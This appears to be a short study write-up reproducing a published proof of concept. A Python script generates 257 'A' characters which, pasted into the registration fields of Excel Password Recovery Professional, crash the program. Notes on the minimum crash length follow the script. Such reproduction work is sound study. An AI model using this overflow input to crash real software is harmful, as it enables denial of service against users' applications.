Software: 2017-08-14  
Tested on: Windows 10 Pro
Credits goes to the exploit author, Achilles.

Steps to reproduce the exploit:
1. Install and run Excel Password Recovery Professional.
2. Click on the Key icon on the top-right hand corner of the application to get a pop-up box which requests for a licensed e-mail and a registration code to register the software.
3. Run python 46003.py.
4. Copy the string of 'A's in exploit.txt and paste them into the 2 fields respectively.
5. Press the Register button.

```python
#!/usr/bin/env python

buffer = "\x41" * 257

try:
    f = open("exploit.txt", "w")
    print "[+] Creating %s bytes of payload:" % len(buffer)
    f.write(buffer)
    f.close()
    print "[+] File created."
except:
    print "[-] File cannot be created."
```

Thoughts:
* We do not really need any code here to generate the exploit string - just a tool to generate `n` number of characters.
* The author had originally created a string of 5000 'A's to crash the program, but after playing around with the values, I found out that the minimum number of characters to crash the program was **257**.
* This means that the maximum length that the variables could have held was only 256. With our string of 'A's, we get the error message that "The Licensed Email or Registration Code you've entered is invalid."
